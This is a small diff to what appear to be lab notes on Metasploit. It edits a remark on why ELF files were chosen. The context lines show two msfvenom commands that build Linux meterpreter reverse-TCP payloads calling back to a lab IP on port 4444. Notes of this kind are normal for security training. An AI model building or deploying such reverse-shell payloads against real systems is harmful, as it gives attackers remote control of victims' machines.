@@ -568,7 +568,7 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o stagedshell LHOST=10.8.1
 msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o nonstagedshell LHOST=10.8.112.253 LPORT=4444
 ```
 #### NOTE:
-> I have took ELF executable
+> I have took ELF executable, as we can't make exe file with these elf based payload
 
 All these binaries are present in the `Linux_.... folder`
 
